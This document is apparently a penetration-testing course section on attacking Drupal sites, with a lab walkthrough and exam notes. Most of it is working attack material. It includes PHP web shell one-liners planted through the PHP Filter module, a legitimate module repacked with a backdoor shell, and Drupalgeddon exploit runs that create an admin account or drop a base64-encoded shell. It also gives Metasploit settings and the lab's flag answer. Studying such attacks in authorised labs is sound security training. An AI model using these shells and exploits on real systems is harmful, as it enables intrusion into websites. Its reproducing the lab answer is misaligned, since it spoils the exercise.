# Section 8 — Attacking Drupal

Three reliable Drupal attack paths:

```
1. PHP Filter module (Drupal ≤ 7) → PHP node → RCE        [needs admin creds]
2. Backdoored module upload (Drupal 8+) → shell.php → RCE  [needs admin creds]
3. Drupalgeddon CVEs → pre/post-auth RCE                   [version-dependent]
```

Unlike WordPress/Joomla, there's no "edit theme file" shortcut — must go through PHP Filter or module upload.

---

## 1 — PHP Filter Module RCE (Drupal ≤ 7)

### When it works
- Drupal version < 8 (PHP Filter built-in, just needs enabling)
- Drupal 8+ requires manual module upload (riskier — get client approval first)

### Steps (Drupal 7)
1. Log in as admin
2. **Modules** (`/admin/modules`) → enable **PHP Filter** → Save configuration
3. **Content → Add content → Basic page** (`/node/add/page`)
4. Paste PHP one-liner:
   ```php
   <?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
   ```
5. Set **Text format** dropdown to **PHP code**
6. Click **Save** → note the node URL (e.g., `/node/3`)
7. Trigger (must be authenticated if node permissions require it):
   ```bash
   curl -s -b session_cookie \
     "http://target/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"
   ```
> Triggers the PHP Filter shell node with the admin session cookie; swap `target`, the node ID, param name, and command.

### Access control gotcha
The node may show "Access denied" to unauthenticated users. Pass the admin session cookie with `-b` flag if needed.

### Cleanup
Delete the node: `/node/<N>/delete` (confirm form submission).  
Log in report: node ID, path, creation time, deletion confirmed.

---

## 2 — Backdoored Module Upload (Drupal 8+)

Used when PHP Filter module isn't available (Drupal 8+) and must be installed.

### Steps
```bash
# Download a real module to backdoor
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Create PHP shell
echo '<?php system($_GET["fe8edbabc5c5c9b7b764504cd22b17af"]); ?>' > shell.php

# Create .htaccess to allow direct access to /modules/ directory
cat > .htaccess << 'EOF'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
EOF

# Bundle into archive
mv shell.php .htaccess captcha/
tar cvf captcha.tar.gz captcha/

# Install via admin: Manage → Extend → Install new module
# Upload captcha.tar.gz → Install
```
> Downloads a real module, plants a PHP shell + .htaccess, and repacks it for upload; swap the module URL and shell param.

```bash
# Trigger shell
curl -s "http://target/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
> Executes commands through the shell inside the uploaded module; swap `target`, the module path, param, and command.

**Note:** Installing a module modifies the client's site — confirm scope before doing this.

### Cleanup
- Uninstall the module via admin
- Remove shell.php and .htaccess
- Log all artifacts in report

---

## 3 — Drupalgeddon Vulnerabilities

### CVE-2014-3704 — "Drupalgeddon" (Drupal 7.0–7.31)

**Pre-authentication SQL injection** → create admin user

```bash
python2.7 drupalgeddon.py -t http://target -u hacker -p pwnd
# [!] VULNERABLE!
# [!] Administrator user created!
# [*] Login: hacker  Pass: pwnd

# Then log in and use PHP Filter for RCE
```
> Exploits Drupalgeddon (CVE-2014-3704) SQLi to create an admin account; swap `target` and the new `-u`/`-p` creds.

Metasploit: `exploit/multi/http/drupal_drupageddon`

### CVE-2018-7600 — "Drupalgeddon2" (Drupal < 7.58, < 8.5.1)

**Pre-authentication RCE** via insufficient input sanitization in user registration

```bash
# PoC: uploads hello.txt to confirm vulnerability
python3 drupalgeddon2.py
# Enter target url: http://target/
# Check: http://target/hello.txt → ;-)

# Modified version: upload PHP shell instead of hello.txt
# Replace echo command in script with:
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
# Then rerun modified script

curl "http://target/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```
> Runs Drupalgeddon2 (CVE-2018-7600) to drop a PHP shell, then executes commands through it; swap `target` and the shell param.

### CVE-2018-7602 — "Drupalgeddon3" (Drupal 7.x, 8.x)

**Authenticated RCE** — requires a user with node-delete permissions

```bash
# Get session cookie first (log in via browser/curl)
# Then use Metasploit:
use exploit/multi/http/drupal_drupageddon3
set rhosts TARGET_IP
set VHOST drupal-acc.inlanefreight.local
set drupal_session SESS45ecfcb93a827c3e578eae161f280548=<value>
set DRUPAL_NODE 1
set LHOST tun0
exploit
```
> Runs Drupalgeddon3 (CVE-2018-7602) via Metasploit using a valid session; swap rhosts, VHOST, the session cookie, node ID, and LHOST.

---

## Drupalgeddon Summary

| CVE | Name | Auth | Drupal Version | Impact |
|-----|------|------|----------------|--------|
| CVE-2014-3704 | Drupalgeddon | None | 7.0–7.31 | SQLi → admin user creation |
| CVE-2018-7600 | Drupalgeddon2 | None | < 7.58, < 8.5.1 | Direct RCE |
| CVE-2018-7602 | Drupalgeddon3 | Yes (node-delete) | 7.x, 8.x | RCE |

---

## Lab Walkthrough

### Hosts
- `drupal-qa.inlanefreight.local` — Drupal 7.30 (PHP filter built-in, CVE-2014-3704 vulnerable)
- `drupal-dev.inlanefreight.local` — Drupal 8.x (Drupalgeddon2 candidate)
- Flag lives at: `/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt`

### Q1 — Flag via PHP Filter (drupal-qa)

```bash
# 1. Login admin:admin → confirmed
# 2. PHP Filter already enabled
# 3. Create node/add/page with PHP shell, format=php_code → node/3

# 4. Execute with admin session cookie
curl -s -b SESSION_COOKIE \
  "http://drupal-qa.inlanefreight.local/node/3?shell=ls%20/var/www/"
# → finds drupal.inlanefreight.local dir

curl -s -b SESSION_COOKIE \
  "http://drupal-qa.inlanefreight.local/node/3?shell=cat%20/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt"

# 5. Cleanup: DELETE /node/3/delete
```
> Full PHP Filter lab chain: hit the shell node with the admin cookie to list `/var/www/` and read the flag; swap the host and flag path.

Node access is denied to anonymous — must pass `-b` session cookie to trigger PHP execution.

**Answer:** `DrUp@l_drUp@l_3veryWh3Re!`

---

## Exam Notes

- PHP Filter = built-in in Drupal ≤ 7, must be installed in Drupal 8+ (get client approval)
- Node created with PHP code format only runs when accessed authenticated (default permissions)
- Shell node requires authenticated session to trigger → pass `-b cookie_jar` with curl
- Drupalgeddon (7.0–7.31) creates admin via SQLi → then enable PHP Filter for RCE
- Drupalgeddon2 (< 7.58/8.5.1) = pre-auth RCE — fastest path if version is right
- Drupalgeddon3 requires auth (node-delete permission) → use Metasploit module
- All vhosts on same server = RCE on any one = read files from all vhost webroots
- CHANGELOG.txt → exact version; use droopescan if blocked
- Cleanup: delete PHP nodes, remove uploaded modules, document all artifacts in report
